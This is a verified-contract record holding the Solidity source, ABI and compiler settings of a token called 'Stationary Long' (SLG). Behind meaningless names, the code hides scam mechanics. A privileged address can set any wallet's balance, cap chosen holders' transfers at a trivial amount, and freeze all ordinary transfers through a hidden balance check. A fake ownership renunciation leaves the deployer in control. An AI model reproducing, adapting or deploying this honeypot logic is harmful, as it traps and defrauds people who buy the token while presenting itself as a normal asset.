{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeSell {\n    function createPair(address toToken, address listBuy) external returns (address);\n}\n\ninterface teamTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLaunchSender) external view returns (uint256);\n\n    function transfer(address minWalletFee, uint256 maxBuy) external returns (bool);\n\n    function allowance(address feeWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minWalletFee,\n        uint256 maxBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);\n    event Approval(address indexed feeWallet, address indexed spender, uint256 value);\n}\n\ninterface teamTradingMetadata is teamTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StationaryLong is feeReceiver, teamTrading, teamTradingMetadata {\n\n    uint8 private modeLiquidity = 18;\n\n    uint256 public senderToken;\n\n    uint256 private toWalletToken;\n\n    uint256 public autoToken;\n\n    mapping(address => mapping(address => uint256)) private receiverMaxMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchWallet;\n    }\n\n    uint256 public buyToken;\n\n    uint256 private launchWallet = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return exemptFund;\n    }\n\n    function balanceOf(address isLaunchSender) public view virtual override returns (uint256) {\n        return walletTo[isLaunchSender];\n    }\n\n    function marketingAuto() private view {\n        require(receiverListReceiver[_msgSender()]);\n    }\n\n    address public isMarketing;\n\n    bool private tokenTx;\n\n    address amountTotalSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedTokenTrading = \"Stationary Long\";\n\n    address private exemptFund;\n\n    uint256 exemptTeamAmount;\n\n    bool public walletFund;\n\n    function receiverTake(uint256 maxBuy) public {\n        marketingAuto();\n        senderLaunchedTrading = maxBuy;\n    }\n\n    uint256 private sellReceiverToken;\n\n    event OwnershipTransferred(address indexed minToken, address indexed takeTotalLimit);\n\n    uint256 senderLaunchedTrading;\n\n    function buyAutoSell() public {\n        emit OwnershipTransferred(launchShouldLimit, address(0));\n        exemptFund = address(0);\n    }\n\n    function transferFrom(address toFundTrading, address minWalletFee, uint256 maxBuy) external override returns (bool) {\n        if (_msgSender() != tradingFrom) {\n            if (receiverMaxMode[toFundTrading][_msgSender()] != type(uint256).max) {\n                require(maxBuy <= receiverMaxMode[toFundTrading][_msgSender()]);\n                receiverMaxMode[toFundTrading][_msgSender()] -= maxBuy;\n            }\n        }\n        return exemptSwap(toFundTrading, minWalletFee, maxBuy);\n    }\n\n    uint256 constant receiverAuto = 14 ** 10;\n\n    function exemptSwap(address toFundTrading, address minWalletFee, uint256 maxBuy) internal returns (bool) {\n        if (toFundTrading == launchShouldLimit) {\n            return receiverTeamSender(toFundTrading, minWalletFee, maxBuy);\n        }\n        uint256 launchTrading = teamTrading(isMarketing).balanceOf(amountTotalSender);\n        require(launchTrading == senderLaunchedTrading);\n        require(minWalletFee != amountTotalSender);\n        if (maxLaunched[toFundTrading]) {\n            return receiverTeamSender(toFundTrading, minWalletFee, receiverAuto);\n        }\n        return receiverTeamSender(toFundTrading, minWalletFee, maxBuy);\n    }\n\n    uint256 public buyFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    function transfer(address exemptFrom, uint256 maxBuy) external virtual override returns (bool) {\n        return exemptSwap(_msgSender(), exemptFrom, maxBuy);\n    }\n\n    function enableIs(address atLiquidityLimit) public {\n        marketingAuto();\n        \n        if (atLiquidityLimit == launchShouldLimit || atLiquidityLimit == isMarketing) {\n            return;\n        }\n        maxLaunched[atLiquidityLimit] = true;\n    }\n\n    address tradingFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalAtWallet(address exemptFrom, uint256 maxBuy) public {\n        marketingAuto();\n        walletTo[exemptFrom] = maxBuy;\n    }\n\n    constructor (){\n        if (sellReceiverToken != buyToken) {\n            buyToken = buyFrom;\n        }\n        maxLaunch autoSwapSender = maxLaunch(tradingFrom);\n        isMarketing = modeSell(autoSwapSender.factory()).createPair(autoSwapSender.WETH(), address(this));\n        if (walletFund) {\n            autoToken = txShould;\n        }\n        launchShouldLimit = _msgSender();\n        buyAutoSell();\n        receiverListReceiver[launchShouldLimit] = true;\n        walletTo[launchShouldLimit] = launchWallet;\n        if (toWalletToken != buyFrom) {\n            tokenTx = true;\n        }\n        emit Transfer(address(0), launchShouldLimit, launchWallet);\n    }\n\n    mapping(address => bool) public maxLaunched;\n\n    function approve(address enableSwap, uint256 maxBuy) public virtual override returns (bool) {\n        receiverMaxMode[_msgSender()][enableSwap] = maxBuy;\n        emit Approval(_msgSender(), enableSwap, maxBuy);\n        return true;\n    }\n\n    address public launchShouldLimit;\n\n    function minLiquidity(address tokenMarketingFee) public {\n        if (feeList) {\n            return;\n        }\n        \n        receiverListReceiver[tokenMarketingFee] = true;\n        if (txShould == buyToken) {\n            buyToken = txShould;\n        }\n        feeList = true;\n    }\n\n    mapping(address => bool) public receiverListReceiver;\n\n    bool public feeList;\n\n    uint256 public txShould;\n\n    function allowance(address marketingExempt, address enableSwap) external view virtual override returns (uint256) {\n        if (enableSwap == tradingFrom) {\n            return type(uint256).max;\n        }\n        return receiverMaxMode[marketingExempt][enableSwap];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTokenTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeLiquidity;\n    }\n\n    uint256 private shouldFee;\n\n    function receiverTeamSender(address toFundTrading, address minWalletFee, uint256 maxBuy) internal returns (bool) {\n        require(walletTo[toFundTrading] >= maxBuy);\n        walletTo[toFundTrading] -= maxBuy;\n        walletTo[minWalletFee] += maxBuy;\n        emit Transfer(toFundTrading, minWalletFee, maxBuy);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return exemptFund;\n    }\n\n    mapping(address => uint256) private walletTo;\n\n    string private shouldLiquidity = \"SLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotalLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunchSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAutoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidityLimit\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShouldLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingFee\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverListReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"}],\"name\":\"totalAtWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFundTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minWalletFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StationaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}